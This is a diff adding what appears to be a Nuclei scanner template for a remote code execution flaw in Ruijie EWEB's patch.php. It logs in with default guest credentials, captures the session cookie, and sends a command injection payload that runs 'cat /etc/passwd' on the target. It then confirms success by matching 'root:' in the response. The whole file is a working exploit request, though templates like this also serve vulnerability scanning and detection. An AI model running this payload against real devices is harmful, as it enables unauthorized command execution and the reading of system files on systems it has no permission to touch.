@@ -1,0 +1,52 @@
+id: poc-yaml-ruijie-eweb-patch-php-rce
+info:
+  name: Ruijie EWEB patch.php Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - raw:
+      - |
+        POST /ddi/server/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=guest&password=guest?
+    extractors:
+      - type: regex
+        name: cookie
+        internal: true
+        part: header
+        regex:
+          - "RUIJIEID=(.*?);"
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /patch.php?a=setPatchAutoTime HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: RUIJIEID={{cookie}};user=guest
+        Content-Type: application/x-www-form-urlencoded
+
+        pram=%20'%3bcat%20/etc/passwd%20%23
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: header
+        words:
+          - "user=guest"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
